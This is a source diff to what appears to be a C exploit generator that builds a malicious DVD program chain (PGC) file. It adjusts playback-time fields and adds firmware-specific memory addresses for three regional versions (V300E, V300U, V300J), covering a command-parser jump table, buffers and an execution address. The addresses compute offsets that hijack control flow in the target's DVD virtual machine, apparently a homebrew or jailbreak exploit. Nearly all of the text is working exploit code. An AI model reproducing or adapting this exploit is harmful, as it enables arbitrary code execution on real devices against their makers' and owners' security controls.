@@ -29,8 +29,8 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     pgc->pgc_gi.set_pgc_pb_tm_hours(0);
     pgc->pgc_gi.set_pgc_pb_tm_minutes(0);
     pgc->pgc_gi.set_pgc_pb_tm_seconds(1);
-    pgc->pgc_gi.set_pgc_pb_tm_frames(5);
-    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_25);
+    pgc->pgc_gi.set_pgc_pb_tm_frames(15);
+    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_30);
     pgc->pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
     pgc->pgc_gi.pgc_pgmap_sa = 0xec;
     pgc->pgc_gi.c_pbit_sa = 0xee;
@@ -43,10 +43,10 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     pgc->c_pbit.pbi[0].set_c_pbtm_hours(0);
     pgc->c_pbit.pbi[0].set_c_pbtm_minutes(0);
     pgc->c_pbit.pbi[0].set_c_pbtm_seconds(1);
-    pgc->c_pbit.pbi[0].set_c_pbtm_frames(5);
-    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_25);
-    pgc->c_pbit.pbi[0].c_lvobu_sa = 23;
-    pgc->c_pbit.pbi[0].c_lvobu_ea = 39;
+    pgc->c_pbit.pbi[0].set_c_pbtm_frames(15);
+    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_30);
+    pgc->c_pbit.pbi[0].c_lvobu_sa = 24;
+    pgc->c_pbit.pbi[0].c_lvobu_ea = 43;
 
     pgc->c_posit.c_posi[0].c_vob_idn = 1;
     pgc->c_posit.c_posi[0].c_idn = 1;
@@ -110,19 +110,38 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 
 #define VOB_PATCH_LOC 0x629
 #define IFO_PGC_PATCH_LOC 0xcc
+#define NEW_PGC_SECT "\x00\x00\x00\x32"
 
+#ifdef V300E
 #define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
 #define VM_ADDR 0x01558e40
-#define CTRL_DATA_ADDR (0x155cec0 + 0x0c + 0x629)
+#define VOB_BUFFER_ADDR 0x0155cec0
 #define JUMP_POINTER 0x0090ec20
-#define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
 #define CMD_DATA_ADDR 0x01551da8
+#define IFO_BUFFER 0x01555600
+#elif V300U
+#define VM_CMD_PARSER_SWITCH_ADDR 0x00909108
+#define VM_ADDR 0x01383840
+#define VOB_BUFFER_ADDR 0x013878c0
+#define JUMP_POINTER 0x0090eb18
+#define CMD_DATA_ADDR 0x0137c7a8
+#define IFO_BUFFER 0x01380000
+#elif V300J
+#define VM_CMD_PARSER_SWITCH_ADDR 0x00684988
+#define VM_ADDR 0x010ff040
+#define VOB_BUFFER_ADDR 0x011030c0
+#define JUMP_POINTER 0x0068a318
+#define CMD_DATA_ADDR 0x010f7fa8
+#define IFO_BUFFER 0x010fb800
+#endif
+
+#define CTRL_DATA_ADDR (VOB_BUFFER_ADDR + 0x0c + 0x629)
+#define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
 #define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
-#define INITIAL_COPY_BUF (0x1555608 + 0x10)
+#define INITIAL_COPY_BUF (IFO_BUFFER + 0x18)
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
-#define NEW_PGC_SECT "\x00\x00\x00\x32"
 
 int main() {
     printf("CMDT_SA: %x\n", CMDT_SA);
